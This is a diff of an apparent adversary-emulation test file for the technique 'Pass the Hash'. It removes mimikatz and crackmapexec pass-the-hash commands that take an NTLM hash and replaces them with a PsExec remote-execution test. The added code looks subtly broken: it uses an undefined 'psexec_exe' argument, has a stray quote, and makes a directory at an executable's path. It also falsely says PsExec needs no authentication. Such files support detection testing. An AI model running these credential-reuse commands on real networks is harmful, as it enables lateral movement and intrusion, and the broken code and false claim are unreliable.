@@ -3,74 +3,31 @@ attack_technique: T1075
 display_name: Pass the Hash
 
 atomic_tests:
-- name: Mimikatz Pass the Hash
+- name: Use PsExec to Pass the Hash. PsExec will execute a command on a remote host without authentication.
   description: |
-    Note: must dump hashes first
-    [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
-
+    Run a command on a remote host using Sysinternalssuite PsExec.
   supported_platforms:
     - windows
-
   input_arguments:
-    user_name:
-      description: username
+    remote_host:
+      description: Remote hostname or IP address
       type: string
-      default: Administrator
-    domain:
-      description: domain
-      type: string
-      default: atomic.local
-    ntlm:
-      description: ntlm hash
-      type: string
-      default: cc36cf7a8514893efccd3324464tkg1a
+      default: localhost
 
-  executor:
-    name: command_prompt
-    command: |
-      mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
-
-- name: crackmapexec Pass the Hash
-  description: |
-     command execute with crackmapexec
-
-  supported_platforms:
-    - windows
- 
-  input_arguments:
-    user_name:
-      description: username
-      type: string
-      default: Administrator
-    domain:
-      description: domain
-      type: string
-      default: atomic.local
-    ntlm: 
-      description: command
-      type: string
-      default: cc36cf7a8514893efccd3324464tkg1a
-    command:
-      description: command to execute
-      type: string
-      default: whoami
-    crackmapexec_exe:
-      description: crackmapexec windows executable
-      type: Path
-      default: C:\CrackMapExecWin\crackmapexec.exe
-
-  dependency_executor_name: powershell
   dependencies:
     - description: |
-        CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})
+        PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})
       prereq_command: |
-        if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }
+        if (Test-Path "#{psexec_exe}"") { exit 0} else { exit 1}
       get_prereq_command: |
-        Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}
+        Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+        Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+        New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
+        Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
 
   executor:
-    name: command_prompt
+    name: powershell
     elevation_required: false
     command: |
-      crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command} 
-
+      /atomics/T1035/bin/PsExec64.exe
+      PsExec64.exe -accepteula \\#{remote_host} "C:\Windows\System32\ipconfig.exe"
